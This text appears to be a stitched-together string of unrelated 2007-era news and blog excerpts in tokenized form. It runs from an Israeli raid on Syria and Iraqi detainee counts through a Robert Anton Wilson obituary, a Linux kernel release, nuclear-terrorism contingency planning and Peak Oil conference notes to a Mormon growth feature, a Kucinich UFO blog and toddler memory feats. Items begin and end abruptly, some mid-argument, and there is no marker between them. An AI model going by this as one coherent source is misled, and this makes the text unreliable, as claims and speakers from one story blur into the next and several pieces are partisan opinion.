In a series of piecemeal leaks from US officials that gave the impression of being co-ordinated , a narrative was laid out that combined nuclear skulduggery and the surviving members of the ' axis of evil ' : Iran , North Korea and Syria .
It also combined a series of neoconservative foreign policy concerns : that North Korea was not being properly monitored in the deal struck for its nuclear disarmament and was off - loading its material to Iran and Syria , both of which in turn were helping to rearm Hizbollah .
Underlying all the accusations was a suggestion that recalled the bogus intelligence claims that led to the war against Iraq : that the three countries might be collaborating to supply an unconventional weapon to Hizbollah .
It is not only the raid that is odd but also , ironically , the deliberate air of mystery surrounding it , given Israel 's past history of bragging about similar raids , including an attack on an Iraqi reactor .
It was a secrecy so tight , in fact , that even as the Israeli aircrew climbed into the cockpits of their planes they were not told the nature of the target they were being ordered to attack .
According to an intelligence expert quoted in the Washington Post who spoke to aircrew involved in the raid , the target of the attack , revealed only to the pilots while they were in the air , was a northern Syrian facility that was labelled as an agricultural research centre on the Euphrates river , close to the Turkish border .
According to this version of events , a North Korean ship , officially carrying a cargo of cement , docked three days before the raid in the Syrian port of Tartus .
That ship was also alleged to be carrying nuclear equipment .
It is an angle that has been pushed hardest by the neoconservative hawk and former US ambassador to the United Nations , John Bolton .
But others have entered the fray , among them the US Secretary of State , Condoleezza Rice , who , without mentioning Syria by name , suggested to Fox television that the raid was linked to stopping unconventional weapons proliferation .
Most explicit of all was Andrew Semmel , acting deputy assistant Secretary of State for nuclear non-proliferation policy , who , speaking in Rome yesterday , insisted that ' North Koreans were in Syria ' and that Damascus may have had contacts with ' secret suppliers ' to obtain nuclear equipment .
' There are indicators that they do have something going on there , ' he said .
' We do know that there are a number of foreign technicians that have been in Syria .
We do know that there may have been contact between Syria and some secret suppliers for nuclear equipment .
Whether anything transpired remains to be seen .
' So good foreign policy , good national security policy , would suggest that we pay very close attention to that , ' he said .
' We 're watching very closely .
Obviously , the Israelis were watching very closely . '
But despite the heavy inference , no official so far has offered an outright accusation .
Instead they have hedged their claims in ifs and buts , assiduously avoiding the term ' weapons of mass destruction ' .
There has also been deep scepticism about the claims from other officials and former officials familiar with both Syria and North Korea .
They have pointed out that an almost bankrupt Syria has neither the economic nor the industrial base to support the kind of nuclear programme described , adding that Syria has long rejected going down the nuclear route .
Others have pointed out that North Korea and Syria in any case have also had a long history of close links - making meaningless the claim that the North Koreans are in Syria .
The scepticism was reflected by Bruce Reidel , a former intelligence official at the Brookings Institution 's Saban Centre , quoted in the Post .
' It was a substantial Israeli operation , but I can't get a good fix on whether the target was a nuclear thing , ' adding that there was ' a great deal of scepticism that there 's any nuclear angle here ' and instead the facility could have been related to chemical or biological weapons .
The opaqueness surrounding the nature of what may have been hit in Operation Orchard has been compounded by claims that US knowledge over the alleged ' agricultural site ' has come not from its own intelligence and satellite imaging , but from material supplied to Washington from Tel Aviv over the last six months , material that has been restricted to just a few senior officials under the instructions of national security adviser Stephen Hadley , leaving many in the intelligence community uncertain of its veracity .
Whatever the truth of the allegations against Syria - and Israel has a long history of employing complex deceptions in its operations - the message being delivered from Tel Aviv is clear : if Syria 's ally , Iran , comes close to acquiring a nuclear weapon , and the world fails to prevent it , either through diplomatic or military means , then Israel will stop it on its own .
So Operation Orchard can be seen as a dry run , a raid using the same heavily modified long - range aircraft , procured specifically from the US with Iran 's nuclear sites in mind .
It reminds both Iran and Syria of the supremacy of its aircraft and appears to be designed to deter Syria from getting involved in the event of a raid on Iran - a reminder , if it were required , that if Israel 's ground forces were humiliated in the second Lebanese war its airforce remains potent , powerful and unchallenged .
And , critically , the raid on Syria has come as speculation about a war against Iran has begun to re-emerge after a relatively quiet summer .
With the US keen to push for a third UN Security Council resolution authorising a further tranche of sanctions against Iran , both London and Washington have increased the heat by alleging that they are already fighting ' a proxy war ' with Tehran in Iraq .
Perhaps more worrying are the well - sourced claims from conservative thinktanks in the US that there have been ' instructions ' by the office of Vice - President Dick Cheney to roll out support for a war against Iran .
In the end there is no mystery .
Only a frightening reminder .
In a world of proxy threats and proxy actions , the threat of military action against Iran has far from disappeared from the agenda .
Could it be that all the hard work environmentally friendly people all over this country to lower co2 emissions is being undone by the continued burning of coal , according to archtecture2030 ( we have covered this great organization before ) coal is the enemy .
Changing light bulbs is great , but to make really massive changes we need to stop burning coal .
WASHINGTON , Aug. 24 — The number of detainees held by the American - led military coalition in Iraq has swelled by 50 percent under the troop increase ordered by President Bush , with the inmate population growing from 16,000 in February to 24,500 today , according to American military officers in Iraq .
Nearly 85 percent of the detainees in custody are Sunni Arabs , the minority faction in Iraq that ruled the country under the government of Saddam Hussein , with the other detainees being Shiite Muslims , the officers say .
Of the Sunni detainees , about 1,800 claim allegiance to a group that calls itself Al Qaeda in Mesopotamia , military officers said .
Another 6,000 identify themselves as takfiris , meaning Muslims who believe some other Muslims are not true believers .
Such extremists view Shiite Muslims as heretics .
Those statistics would seem to indicate that the main inspiration of the hard - core Sunni insurgency is no longer a desire to restore the old order — a movement that drew from former Baath party members and security officials who served under Mr. Hussein — and has become religious and ideological .
Stock options , free meals , lecture fees – the pharmaceutical industry showers them all on department heads at some US medical schools .
Drug companies are big investors in medical research and post - qualification training for doctors .
Now a survey by Eric Campbell of Massachusetts General Hospital in Boston and his colleagues has put figures on the industry ’s involvement .
Nearly two - thirds of heads of department from 140 medical school and teaching hospitals said they had some relationship with industry .
Over a quarter acted as paid consultants and 1 in 10 sat on a board of directors .
Five of the 459 heads reported receiving gifts …
According to reliable sources , I died on February 22 , 1994 — George Washington 's birthday .
I felt nothing special or shocking at the time , and believed that I still sat at my word processor working on a novel called Bride of Illuminatus .
At lunch - time , however , when I checked my voice mail , I found that Tim Leary and a dozen other friends had already called to ask to speak to me , or — if they still believed in Reliable Sources — to offer support and condolences to my grieving family .
I quickly gathered that news of my tragic end had appeared on the Internet in the form of an obituary from the Los Angeles Times : " Noted science - fiction author Robert Anton Wilson was found dead in his home yesterday , apparently the victim of a heart attack .
Mr. Wilson , 63 , was discovered by his wife , Arlen .
" Mr. Wilson was the author of numerous books ...
He was noted for his libertarian viewpoints , love of technology and off the wall humor .
Mr. Wilson is survived by his wife and two children . "
enjoyed his first death so much ; he decided to try it again .
As Wilson himself wrote in his 1995 book , Cosmic Trigger III : My Life After Death
This time around , it appears that Mr. Wilson has actually left corporeality , appropriately on 1/11 ( at 4:50 am — you hardcore number freaks can get to work on the meaning of that one ... I do see a five in there ! ) .
For this cosmic cub scout , Bob Wilson was the motherload .
Books like The Illuminatus !
Trilogy Cosmic Trigger , and Coincidance killed most of what little dogmatism I had left in me , and opened me up to a world of possibilities as large as space travel and as small as quantum physics .
He also had a razor sharp wit that he skillfully aimed at those who abuse power and wealth .
And he was a delightful story teller , whose love of language was evidenced not only by his own novels , but by his ability to quote virtually everything James Joyce and Ezra Pound ever wrote — backwards , while explaining what evolutionary level of primate behavior the author was elucidating .
I had the great pleasure to know Robert Anton Wilson and our intersections were sometimes strange — his Mondo 2000 check had n't arrived ; or I weirded him out by kneeling down before him like he was the pope and kissing his ring ( I thought it was funny . )
I also have great memories of sitting with him while he expounded expansively on everything from the rights of the Irish to the genius of Orson Welles .
Over the past several years , as his polio returned , and as death started to hover nearby , Wilson sent out funny email messages of the " not dead yet " variety to those of us on his mailing list .
There was never a trace of self - pity in any of his messages .
As the result of medical expenses and problems with the IRS , Wilson found himself in a financial squeeze towards the end of his life .
Word went out and the internet community responded by sending him $ 68,000 within the first couple of days ( and undoubtedly some more after that ) .
This allowed RAW to die with the comfort , grace and dignity that he deserved .
Special props go to Douglas Rushkoff and the folks at Boing Boing ( and to all the individuals who contributed ) for making that happen .
Robert Anton Wilson taught us all that " the universe contains a maybe . "
So maybe there is an afterlife , and maybe Bob 's consciousness is hovering around all of us who were touched by his words and his presence all these years .
And if that 's the case , I 'm sure he'd like to see you do something strange and irreverent — and yet beautiful — in his honor .
Lead Linux Kernel developer Linus Torvalds announced the first release candidate ( - rc ) of the 2.6.24 kernel today , calling it one of the biggest - rc releases ever .
" Usually the compressed - rc1 diffs are in the 3 - 5 MB range , with occasional smaller ones , and the occasional ones that top 6 M , but this one is * eleven * megs , " said Torvalds in a mailing list post .
" In short , we just had an unusually large amount of not just x86 merges , but also tons of new drivers ( wireless networking stands out , but is by no means the only thing — we've got dvb , regular wired network , mmc etc all joining in ) , and a fair amount or architecture stuff , filesystems , networking etc too . "
The final 2.6.24 release is planned for the end of the year , and will likely include CFS group scheduling , improved support for containers , and possibly support for static probe points via kernel markers .
More tough decisions would arise later .
People downwind could leave their homes or stay , leave for a while and then come back or leave and come back briefly to retrieve valuables .
The choices would be determined by the dose of radiation they were willing to absorb .
Except in the hot zone around the blast and a few miles downwind , even unsheltered people would not be exposed to enough radiation to make them die or even become sick .
It would be enough only to raise their statistical chance of getting cancer later in life from 20 percent ( the average chance we all have ) to something greater — 21 percent , 22 percent , up to 30 percent at the maximum survivable exposure .
Similar choices would face first responders and troops sent to the stricken area : how close to ground zero could they go , and for how long ?
Few would choose to have their risk of death from cancer go up to 30 percent .
But in cases of smaller probabilities — an increase to 20.1 percent , for example — a first responder might be willing to go into the radiation zone , or a resident might want to return to pick up a beloved pet .
These questions could be answered only by the individuals themselves , based on information about the explosion .
Next comes the unpleasant fact that the first nuclear bomb may well not be the last .
If terrorists manage to obtain a weapon , or the fissile material to make one ( which fits into a small suitcase ) , who ’s to say they would n’t have two or three more ?
And even if they had no more weapons , the terrorists would most likely claim that they did .
So people in other cities would want to evacuate on the day after , or at least move their children to the countryside , as happened in England during World War II .
The United States government , probably convened somewhere outside Washington by the day after , would be urgently trying to trace the source of the bombs .
No doubt , the trail would lead back to some government — Russia , Pakistan , North Korea or other countries with nuclear arsenals or advanced nuclear power programs — because even the most sophisticated terrorist groups cannot make plutonium or enrich their own uranium ; they would need to get their weapons or fissile materials from a government .
The temptation would be to retaliate against that government .
But that state might not even be aware that its bombs were stolen or sold , let alone have deliberately provided them to terrorists .
Retaliating against Russia or Pakistan would therefore be counterproductive .
Their cooperation would be needed to find out who got the bombs and how many there were , and to put an end to the campaign of nuclear terrorism .
It is important to continue to develop the ability to trace any bomb by analyzing its residues .
Any government that did not cooperate in the search should , of course , face possible retaliation .
Finally , as buildings and lives were destroyed , so would the sense of safety and well - being of survivors , and this in turn could lead to panic .
Contingency plans for the day after a nuclear blast should demonstrate to Americans that all three branches of government can work in unison and under the Constitution to respond to the crisis and prevent further destruction .
A council of , say , the president , the vice president , the speaker of the House and the majority leader of the Senate , with the chief justice of the Supreme Court present as an observer , could consider certain aspects of the government ’s response , like increased surveillance .
Any emergency measures instituted on the day after should be temporary , to be reviewed and curtailed as soon as the crisis ends .
Forceful efforts to prevent a nuclear attack — more forceful than we have seen in recent years — may keep the day from coming .
But as long as there is no way to be sure it will not , it is important to formulate contingency plans that can save thousands of lives and billions of dollars , prevent panic and promote recovery .
They can also help us preserve our constitutional government , something that terrorists , even if armed with nuclear weapons , should never be allowed to take away .
As Dr. James Schlesinger , the first Secretary of Energy , said in his Opening Address , the battle is over , Peak Oil is now accepted as inevitable , and the debate only becomes as to when .
We have “ won ” and need to learn to take Yes ! as an answer .
He spoke mainly of three things – the arrival of the Peak and the recognition that is starting to grow , and to mean that we are no longer lone voices crying in the Wilderness .
Trade and government publications are already acceding with back - door concessions that we are facing a moment of truth .
He paid tribute to Colin Campbell ’s dictum that “ before you produce it , you have to develop it ” , and reminded us of the gap in matching discoveries as the old fields die out .
Having been there , he told of the oil industry laughing when President Carter discussed renewable energy back in 1979 .
Back then “ conservation was not the American way , production was the American way . ”
But now , to sustain production we need to find 4 or 5 fields the size of all those in Saudi Arabia .
It is not going to happen , but before we celebrate , remember that there are political and technical realities .
And , as the day wore on , the mercilessness of the numbers began to be apparent .
Cork , so the Deputy Lord Mayor told us , is the port that the Titanic sailed from .
It is also the place that took delivery of 57 Steinways for its new school of music , and so it was appropriate that we were entertained with song and dance this evening .
It should have been a celebration .
This was his second theme , that people do not want to admit they were wrong .
That we who were right are being shown to be so , but must be magnanimous in our victory lest we worsen the situation .
Remember that the presence of the Peak does not drive action , and that action can only come through the acts of politicians .
Politicians work for a public that expects that becoming independent of oil will lower the fuel and power bills .
In the US there was a pledge made by President Nixon in 1973 , that the country would be oil independent by 1980 .
By then oil imports were up 60 % , and today they are three times the 1973 numbers .
The first rule of a politician is to get elected , and the second rule is to get re-elected .
( Cassandra ’s and those asking for sacrifice rarely succeed at task 2 ) .
Putting this all together was the clear implication that , while we were n’t standing on the deck of an aircraft carrier , that the job was not over , but rather must now move to a different phase .
This , his third theme , will require patience as we decide what to do .
International fleets of cars cannot be replaced overnight and provide a necessary support leg to existing society .
The internal combustion engine needs liquid fuel , and because memories of the last time we had a problem have faded , we need to hit the public over the head with a metaphorical 2X4 to get them to sense the size of the problem .
While human ingenuity cannot be dismissed , it is very time consuming and some 15 - 20 years will be required to get us where we need to be .
While dismissing corn ethanol , he did seem impressed by cellulosic ethanol ( and could have been influenced by Khosla on this ) .
Yet at the moment this is all still a political game ( if it were serious there would be no $ 0.50 duty on Brazilian ethanol ) .
He sees the fight over Global Warming as a passion in Europe , but a transient phase in the US ( partially because of the futility of action given Chinese coal use ) .
And he pointed to Senator Reid as a reason that more immediate steps to mitigate the crisis are not being taken .
He did see the next Congress passing “ cap and trade ” legislation , though with enough loopholes ( as in Europe ) to give it little value .
And he worries about the vulnerability of the oil supplies that travel on the high seas .
Ray Leonard was next , and talked mainly about the FSU in the context of the 2006 Hedberg Conference .
The rule for that is that you are only invited if you present , it is invitation only , and attendees cover the waterfront .
With that background he was not kind to the USGS survey reports on remaining reserves .
In contrast to such rosy predictions he suggested ( from that conf ) , that the real numbers would be on the order of Western Siberia 8 billion barrels ( bbo ) , relative to USGS 55 bbo ; Niger Delta 18 bbo , relative to 40 USGS ; S.W. Africa 15 vs 30 ; Caspian 10 vs 20 ; Gulf of Mexico 18 vs 42 bbo ; Brazil 7 vs 39 , and KSA 60 rather than 136 bbo .
The revised total was 250 bbo waiting discovery , rather than 700 bbo .
Looking at Western Siberia he noted that the first 100 fields discovered averaged 100 bbo ; the second 100 averaged 40 bbo ; the third 100 averaged 10 ; the fourth 4 ; and the fifth 2 bbo .
Optimistic claims to reverse this trend lack credibility .
The change to FSU from SU allowed a recalculation of reserves , but that bite of the apple can only be taken once .
Some reserve growth is legitimate and he felt that particularly for the FSU and ME there will be more growth ( to a total of 490 bbo ) if the money is properly spent .
Technology to enhance production depends on how much it costs .
For example if the baseline is 1 , then discovery costs are 1.2 times that base , to optimize production ( infield drilling etc ) will be at 1.8 times the base cost , and EOR and tertiary recovery will run 4.7 times base cost .
So that if deep offshore is at $ 20 boe base cost , then tertiary recovery will cost $ 95 a barrel , and we ai n’t there yet .
He thinks that tertiary will add 10 % to field production ( for Siberia moving it from 35 % to 45 % ) .
It is this type of gain that makes him predict that Russia will sustain current production for at least another decade .
He was deeply cynical about unconventional oil ( Venezuelan heavy crude and the Canadian oil sands ) .
He anticipates only around 2.5 mdb from Canada by 2015 , with lots of unexpected costs and issues ( though many have been discussed here and in TOD Canada ) .
Venezuela might hold current Orinoco production ( at around 800,000 bd ) but wo n’t have the political ability and will to increase this .
Putting this all together he thinks that the world will run at capacity for some 1 to 5 years , and that this will be at a plateau of 95 to 100 mbdoe .
It will occur , however , in a very high price environment .
To date we are only in a high price environment .
He was followed by Mike Rogers of PFC Energy , who have recently completed a supply forecast .
It has three messages :
Oil prices will remain high , or higher .
There will be little to no growth in exports , outside of the FSU .
There will be 3 barrels produced for every barrel found .
Basically by 2010 he feels that non-OPEC will have peaked , and be starting to decline , and that the only growth in OPEC will be from heavy oil and NGL .
For this he sees OPEC giving 33 - 36 mbdoe in 2010 ; 37 - 55 in the 2015 timeframe ; 50 mbd by 2020 .
Looking at production data the records seem to indicate that when fields are around 54 % depleted then production begins to significantly decline ( though there is a range ) .
On average for non-OPEC , non-FSU the combined producing countries are seeing a decline of around 5 - 7 % that will start to have a significant impact after 2009 .
In the former Soviet Union there is a possibility to achieve 13 – 16 mbdoe by 2015 .
However depletion is growing and though there are 11 new fields to come on stream in Russia the peak there may be reached in 2012 when , if all goes well , the country might achieve 11 mbdoe .
But then it falls off .
Azerbaijan may get up to 1.2 mbdo , and Khazakstan may reach 2.1 mbdoe , though dates are slipping and production may have a number of complications .
Combining the three gives the FSU peak in 2015 but it is expected to decline significantly thereafter .
He was more optimistic that Ray on Unconventional , thinking that the Canadians might be able to get up to 4.8 mbdoe in Alberta by 2015 , with an ultimate peak of 7.5 mbdoe .
Turning to OPEC Qatar has lots of NGL but is imposing a moratorium until they can decide how to spend the money .
Outside of that there has been a disappointing history of exploration , with the result that many fields are getting up to 60 % produced , so that the region combined may reach there in a couple of decades .
When all this comes together his feeling was that the OOPS moment will come in 2014 at less than 100 mbdoe .
After a break Pierre - Rene Bauquis talked on the role of nuclear and gas ( he was initially going to talk about natural gas supplies ) .
He sees a non-OPEC peak of 60 mbdoe and possibly an OPEC peak of 40 mbdoe , though he thinks the latter unlikely .
Oil companies have largely backed out of nuclear , although it has potential not only for general use , but also for specific field uses .
Particularly he saw this role for helping with heavy oil .
It will also help in production of hydrogen , which will become more viable closer to 2020 , as oil prices head over $ 200 .
Its use will probably , however , be chemical rather than as a transport fuel , since there will still be more viable alternatives .
By 2100 the energy for transportation will come 30 % from oil and gas , 60 % from nuclear power , and 10 % from other renewables .
The first presenters were then joined by 3 more panelists for a discussion .
Jim Buckee gave an operator ’s perspective and felt that the commentators were too optimistic given the shortage of labor , skilled engineers and equipment .
He already faces decline problems every day in his work , but while it is now controlled , when it reaches 7 % then there will be another OOPS moment .
Oil wells decline exponentially , gas wells go faster , but for many fields post peak , this can reach over 11 % pa .
Chris Skrebowski noted that this has been the longest period that world production has effectively sat on a plateau , across a range of possible producers .
For the next 6.5 years the die is already close to being cast on production schedules and thus in his Megaprojects lists he can predict production out to 2014 .
He used 4 % for depletion ( the industry used to be able to hold 3 % ) Working these numbers , and allocating for internal consumption , he sees that we have two good years left , then by 2011 we will be post peak and OOPS .
Eddie Walshe noted that 40 % of hydrocarbon fuels are natural gas , which still has lots of reserves , but in Russia , Iran and Qatar .
With this constricted supply prudence would suggest that alternate sources be developed , but it should be remembered that power companies such as Centrica do n’t have the resources for a nuclear or coal fired power plant .
Finally in the morning session Gareth Roberts , who does gas - injection EOR felt that the 35 - 45 % increase that had been mentioned is too low , and with proper EOR it can add 20 % to field production .
However the time frame for this to have an effect will be post - peak .
Part of the problem is that the industry is still costing projects anticipating $ 40 oil , and thus killing projects that are viable at today ’s $ 80 figures .
It gives an EROI of 4 - 5: 1 in fields that may be down to 3:1 EROI with conventional production .
Orinoco uses 12 % of produced energy for production , while SAGD requires 25 - 30 % .
Natural gas is harder to predict since it can move through rock faster , but the panel thought that a peak 10 years after that for oil was the right ballpark .
It was then time for lunch ( and so a break since I will now head bedwards ) .
To be continued .

Puppet video of Craig denial hits YouTube
Jason Rhyne
Published : Friday August 31 , 2007

A new YouTube video looks to Broadway to shed a little light on GOP Sen .
Larry Craig 's emphatic denials of homosexuality .
Cutting together Craig 's statement in an Aug. 28 news conference with music and lyrics from the puppet - heavy Broadway hit Avenue Q , the video throws a little furry sympathy the senator 's way via the show 's topical number " If You Were Gay . "
" If you were gay , that 'd be ok , " a puppet croons , " further insisting that " If you were gay , I 'd shout hooray . "
The puppet later promises to stand " beside you every day to tell you its ok .... you were just born that way ! " and gently explains " its in your DNA . "
LIKE any religious community , the Church of Jesus Christ of Latter - day Saints ( better known as the Mormons ) will always cherish the locations connected with its foundation story .
Not only the places in New York state where its prophet , Joseph Smith , said he received a vision of God ( in 1820 ) and then a new set of scriptures , or the faith 's spectacular headquarters in Utah , the state where Mormon pioneers found refuge .
Also dear to Mormon hearts are parts of northern and central England where , soon after Smith had his visions , the faith won many converts .
In those early days , people in Britain who accepted Mormon teaching were told to sail west and join the growing band of “ saints ” who were preparing for the second coming of Jesus , an event which was expected to happen soon , and in the new promised land , the United States .
But now , after a century of spectacular growth , the Mormon movement is flowing in the other direction : while it continues to be centrally directed from its headquarters in Salt Lake City , Utah , the faith has gained a foothold in virtually every country in the world — and the American share of church membership has fallen .
In the north - west of England , for example , the Mormons want their converts to stay put and use their spanking new meeting - house and temple ; and their keen young missionaries are as likely to be British or Danish ( even , in one case , from Greenland ) as American .
And there is hardly anywhere ( not even Mongolia , see picture ) where the proselytisers do not reach .
Rodney Stark , an American sociologist , pronounced 20 years ago that the Mormon faith was on the way to becoming the first world religion to be founded since Muhammad ; he thought the number of adherents might exceed 260 m by the second half of the 21st century .
Since then , the rate of growth has eased a little , though it remains impressive compared with many Christian denominations .
And the question of whether the Mormon faith really is a global religion — or an American one with many foreign adherents — still stirs arguments .
Douglas Davies , a professor at Britain 's Durham University , says the Latter - day Saints are too centralised to be a “ world religion ” in the full sense : only if different continents and cultures develop their own styles of Mormon worship can the religion be likened to universal ones like Buddhism or Islam .
For now , at least , the Mormons present as paradoxical a mix of American and global culture as any multinational with headquarters in the United States and customers across the world .
When the Mormons hold their twice - yearly conferences in Salt Lake City , the great majority of the 21,000 people present are American — but organisers take pride in the fact that proceedings are translated into 86 languages and broadcast all over the world .
The book of Mormon — the text which Joseph Smith said he received — has been rendered , at least in part , in over 105 tongues .
The best - known adherents of the faith — from Mitt Romney , the Massachusetts governor and possible future president , to Brandon Flowers , a singer with the Killers rock group — are emphatically American .
Of the “ 12 apostles ” who form the faith 's inner circle , only one was born outside the United States , and most are from Utah .
But non-Americans , especially from the Spanish or Portuguese - speaking world , are inching up the hierarchy .
One of the “ quorum of 70 ” ( the next layer of authority after the apostles ) is Japanese and another British .
Wherever it goes , the faith retains a Middle Western flavour , with its mixture of social conservatism , philanthropy , worldly shrewdness and devotion to a core set of beliefs .
The movement 's president — seen ex officio as a “ prophet ” — is an unmistakably American figure , 96 - year - old Gordon Hinckley .
But he has travelled to every corner of the world and overseen a global programme of building temples — giant buildings where sacraments , such as marriage and baptism , take place .
The faith 's fastest growth has been in Latin America — where native Americans warm to the Mormon teaching that they descend from a lost tribe of Israel , and the Roman Catholic church is often too stretched , or ideologically divided , to feed its notional flock .
Out of a worldwide membership of 12.7 m , Brazil and Mexico each account for about 1 m .
The ex-Soviet republics — another area where many people long for religion and older faiths are imperfectly organised — could in principle be fertile ground , but in practice pickings have been thin : there are 19,000 adherents in Russia and 10,000 in Ukraine .
Why do the Mormons attract followers while many other religions decline ?
Is it the aura of American prosperity , health and sobriety , which seems so appealing in an African village or a Mexican slum ?
Mr Davies thinks the most compelling feature of Mormon teaching is its confidence that death has been conquered : believers look forward with certainty to eternal life ( with their spouses ) , and by conducting posthumous baptisms they can also save their dead forebears .
For Margaret Barker , a Methodist scholar , part of the faith 's power lies in its insistence that prophecy and divine revelation did not just happen once , a long time ago : the flow of messages from God is still in progress .
Despite the good relations they cultivate with world leaders , the Mormons ' expansion is not always popular : the late Alexander Lebed , a Russian politician , once said they should be banned .
And in Islamic countries Mormons face at least as many obstacles as other non-Muslim believers do .
But paradoxically these two faiths have things in common .
Like the Muslims , the Mormons believe God 's covenant with Abraham , and the message of Jesus of Nazareth , were distorted by later generations — only to be corrected by their own prophet .
And like the Muslims , the Mormons will be preachers in the world pulpit in the third Christian millennium .
It was predictable that just as people in the Democratic primary states are starting to notice that of all the candidates running for the party 's nomination , it is Dennis Kucinich who stands solidly for everything that they care about -- ending the war , impeaching the president and vice president , establishing universal government - funded health care ( with the blood - sucking insurance industry out of the picture ) , ending trade agreements like NAFTA that just ship US jobs overseas , respecting international law , restoring the Constitution , insuring the unfettered right to abortion on demand , etc. -- the media would attempt to label him a wacko .
Tim Russert played the hitman , asking Kucinich in the last debate whether he'd ever seen a UFO , and then cutting him off so he could only answer yes without any real explanation .
Well , let me join Dennis and say that I too have seen a UFO .
Two actually , though the first one was explained later .
The first , which I saw when I was in high school , appeared as a bright light in the sky , then rapidly expanded into big green circle , which then faded away .
There were two more of these events .
I was awestruck .
So were thousands of people who began calling police departments to report them .
It turned out , as we read in the paper the next day , that NASA had fired three rockets from Wallops Island off Virginia , up some 60 miles into space , where they exploded , releasing some kind of green gas .
So it was a UFO for a day .
Then it was an IFO -- an identified flying object .
The other sighting remains a UFO .
It happened back around 1970 .
I was travelling in the late afternoon , right around sunset , down Route 9 from Middletown , CT to Old Saybrook .
As I was driving , I noticed a small shiny object up in the sky flying parallel to the ground at a very high rate of speed .
The sun was glinting off of it , making it especially bright .
It caught my attention because it was flying much faster than a commercial jet , and was leaving no contrail .
There was no apparent shape to it .
That is , I could n't see wings or a tail , but it was pretty far off .
I was just speculating as to whether it might be a supersonic military jet when suddenly the thing made an abrupt right angle turn , way beyond the capabilities of any airplane -- and so fast that anyone sitting inside it would have been killed by the G - forces -- and then shot straight up into the sky , much faster than before , and just disappeared .
Now that was bizarre !
I still do n't know what to make of it .
There may be an explanation somewhere that would make this an IFO , but for me , it remains a UFO .
So does that preclude me from being taken seriously if I write about plans to restore the draft , or about the impeachable crimes of the Bush / Cheney administration ?
Of course not .
I 'm a major skeptic when it comes to UFO's .
It seems to me highly unlikely that any civilization technologically advanced enough to have mastered interstellar flight would have any interest in our pathetically primitive activities here on earth , if they even knew we were here , plus the odds of there being such a highly advanced civilization anywhere within a thousand lightyears of the earth are incredibly small .
Still , some rather credible people -- airline pilots and police officers -- have reported seeing some very strange things over the years , and the galaxy ( not to mention the universe ) , is a mighty big place .
It would be wacky to simply assert that extraterrestrial life does not exist .
And it would be wrong to say that there are not UFOs .
Indeed , it seems to me it is far more likely that there are aliens in this universe and even that they visit us occasionally , than that there is some omnipotent god that is running the show , or that , if it exists , would give a rats ass about us here on Earth .
Neither Dennis Kucinich nor I are saying we saw aliens .
I do n't know what Kucinich saw , but I know what I saw , and it was n't something that could be easily explained away as a plane or a rocket .
So I 'm calling it a UFO .
And I feel much more comfortable voting for someone for president who admits to having seen a UFO like I have , than for someone who says god talks to him , or who says she wo n't preclude dropping a nuclear weapon on Afghanistan , and who cannot commit to having all US troops out of Iraq five years from now !

How Young Is too Young to Start Studying ?
Some tots show impressive skills , but they 're not all true prodigies .
Oct. 11 , 2007  --
Like most 3 - year - olds , Adrian loves to swing , eat ice cream , ride his toy car and watch videos , but there 's something Adrian does that most other 3 - year - olds do n't — he can reel off the names of the 50 U.S. state capitals and he also knows the capitals of more than 100 countries .
The television show " Are You Smarter Than a Fifth Grader ? " challenges adults to match wits with grade schoolers .
Well , forget fifth - graders .
Are you smarter than a 3 - year - old ?
Many adults probably would n't be able to answer the questions that Adrian 's father , Manny Aivaliotis , throws at his son .
Aivaliotis : " Hey Adrian , what 's the capital of Argentina ? "
Adrian : " Buenos Aires . "
Aivaliotis : " What about the Bahamas ? "
Adrian : " Nassau . "
Aivaliotis : " Canada ? "
Adrian : " Ottawa . "
Lilly Gaskin , who just turned 2 last month , is not old enough to really talk yet , but she knows where more than 78 countries are located on a map .
Ask her where Malaysia or Ghana is and she 'll point it out with her finger .
She started doing this at 16 months .
James Gaskin , Lilly 's father , says his daughter blows people away with this skill .
" They think it 'll stop after about three countries , " he said , " and then it goes and goes .
And 10 minutes later , she 's still going and they 're tired .
Yeah , it blows 'em away .
It blows us away . "
Keeping Up With the Kids
Lilly certainly blew away Rachael Ray 's studio audience when she recently made her national television debut .
So do Lilly 's parents use the G word to describe their daughter ?
" Our little genius ? " said Gaskin .
" Yeah .
She 's just really smart . "
Gaskin and his wife , Nikki , worry about their responsibility as parents to offer Lilly the best education possible .
" I think it 's going to be very difficult to keep up with her , " said Gaskin .
This was also a point reiterated by Adrian 's mother , Carrie Aivaliotis .
" I kind of feel a pressure to see what we need to do for him to make sure he 's not bored or getting into trouble .
People warned us if he knows everything already for the first few grades , he 's gonna be a discipline problem because he's not gonna be learning anything , " she said . "
Really gifted children fascinate us .
How can someone so young know so much ?
Their feats of memory are huge hits on the Internet and a staple of TV talk shows .
Abby Julo has been on the TV circuit since she was 3 .
She 's been a guest on " The Tonight Show " four times , where she loves to talk about her passion : politics .
Jay Leno : " Abby , how many states did it take to ratify the Constitution ? "
Then - 4 - year - old Abby : " Nine .
Delaware , Pennsylvania , New Jersey , Georgia , Connecticut , Massachusetts , Maryland , South Carolina and New Hampshire ! "
Abby 's also been on Oprah Winfrey 's talk show , not once , but three times .
Now , at the ripe old age of 8 , Abby is something of the grand dame of child prodigies .
Abby can name every U.S. president , in order , in less than a minute .
" 20/20 " took her to the president 's room at Madame Tussauds Wax Museum in New York City .
She was so inspired that she recited , by heart , President Kennedy 's 1961 inaugural address from start to finish .
" My fellow Americans , ask not what your country can do for you , ask what you can do for your country … "
' Wired to Learn '
So are these kids really geniuses ?
Certainly what Abby and Lily and Adrian do is unusual .
Most of us can't do it , but just how remarkable is this ?
Stanford University psychology professor Carol Dweck , who studies child development , says memorization is not a sign of genius .
" Children come wired to make these associations to learn , " Dweck said .
Dweck , the author of " Mindset : The New Psychology of Success , " agrees that the kinds of memory skills demonstrated by these kids are impressive and unusual .
Dweck cautioned though that " it 's not what you would call a prodigy .
A prodigy is someone who has a deep precocious understanding of something — of numbers , words , music .
They think in new ways , invent things . "
A true prodigy is someone like Picasso or Mozart who was composing by age 5 , or Tiger Woods who shot a 48 on a nine - hole course by the age of 2 .
Do n't worry , though , if your 2 - year - old is n't showing signs of being a prodigy , says Dweck .
And parents certainly do n't need to tap into the $ 3.5 billion educational toy industry to make their youngsters smarter .
" We do n't know who the future geniuses are , " said Dweck .
" Edison was not a genius as a boy .
His passion made him a genius .
Even Einstein was n't a genius as a child .
It 's true — he was rather slow .
People worried about him .
But he had this passion for learning .
He made himself into a genius . "
It 's funny to imagine that Einstein as a child may not have been able to successfully master all the Baby Einstein games named after him !
Proper Parental Praise
And what about telling your kids they 're smart ?
Virtually all parents — 85 percent , according to a Columbia University poll — say it 's important to tell kids they 're smart .
